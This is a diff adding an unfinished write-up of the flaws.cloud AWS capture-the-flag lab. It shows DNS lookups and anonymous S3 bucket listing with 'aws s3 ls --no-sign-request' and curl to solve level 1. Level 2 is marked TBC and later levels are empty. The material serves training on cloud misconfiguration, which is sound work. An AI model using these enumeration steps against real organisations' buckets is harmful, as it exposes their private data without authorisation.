@@ -318,6 +318,121 @@ WjGvoMRN0a/mxpqX1WyPDEuwNoT547VnXNo2fKsZjsvqmjMGg5wFh4ERhFczb6gg
 
 # CTFs and hands-on material
 ## flaws.cloud
+```
+Scope: Everything is run out of a single AWS account, and all challenges are sub-domains of flaws.cloud.
+```
+
+### Level 1
+```
+This level is *buckets* of fun. See if you can find the first sub-domain.
+```
+
+Checking if the website is hosted in an S3 bucket
+```
+┌──(kali㉿kali)-[~]
+└─$ nslookup flaws.cloud                                           
+Server:         10.0.2.3
+Address:        10.0.2.3#53
+
+Non-authoritative answer:
+Name:   flaws.cloud
+Address: 52.92.152.19
+<snip>
+                             
+┌──(kali㉿kali)-[~]
+└─$ nslookup 52.92.152.19
+19.152.92.52.in-addr.arpa       name = s3-website-us-west-2.amazonaws.com.
+```
+
+And trying to list files inside the S3 bucket. Note how to `--no-sign-request` signals we're trying to access the bucket as an anonymous user
+```
+┌──(kali㉿kali)-[~]
+└─$ aws s3 ls flaws.cloud                             
+Unable to locate credentials. You can configure credentials by running "aws configure".
+                                                                                                                                                                                     
+┌──(kali㉿kali)-[~]
+└─$ aws s3 ls flaws.cloud --no-sign-request
+2017-03-13 22:00:38       2575 hint1.html
+2017-03-02 22:05:17       1707 hint2.html
+2017-03-02 22:05:11       1101 hint3.html
+2024-02-21 20:32:41       2861 index.html
+2018-07-10 11:47:16      15979 logo.png
+2017-02-26 19:59:28         46 robots.txt
+2017-02-26 19:59:30       1051 secret-dd02c7c.html
+```
+
+Curling the secret file, level 1 is solved
+```
+┌──(kali㉿kali)-[~]
+└─$ curl flaws.cloud/secret-dd02c7c.html
+<snip>
+ _____  _       ____  __    __  _____
+|     || |     /    ||  |__|  |/ ___/
+|   __|| |    |  o  ||  |  |  (   \_ 
+|  |_  | |___ |     ||  |  |  |\__  |
+|   _] |     ||  _  ||  `  '  |/  \ |
+|  |   |     ||  |  | \      / \    |
+|__|   |_____||__|__|  \_/\_/   \___|
+</pre>
+
+<h1>Congrats! You found the secret file!</h1>
+</center>
+
+Level 2 is at <a href="http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud">http://level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud</a> 
+```
+<br>
+
+### Level 2
+```
+The next level is fairly similar, with a slight twist. You're going to need your own AWS account for this. You just need the free tier.
+```
+
+Using the same technique works to verify that it is indeed an S3 bucket
+```
+┌──(kali㉿kali)-[~]
+└─$ nslookup level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud       
+Server:         10.0.2.3
+Address:        10.0.2.3#53
+
+Non-authoritative answer:
+Name:   level2-c8b217a33fcf1f839f6f1f73a00a9ae7.flaws.cloud
+Address: 52.92.164.11
+
+<snip>                                                                                                                                                                                                                                           
+┌──(kali㉿kali)-[~]
+└─$ nslookup 52.92.164.11                                       
+11.164.92.52.in-addr.arpa       name = s3-website-us-west-2.amazonaws.com.
+```
+
+But anonymous access no longer works. This will require setting up an AWS account
+
+<TBC>
+
+<br>
+
+### Level 3
+
+
+
+<br>
+
+### Level 4
+
+
+
+<br>
+
+### Level 5
+
+
+
+<br>
+
+### Level 6
+
+
+
+<br>
 
 ## flaws2.cloud
 
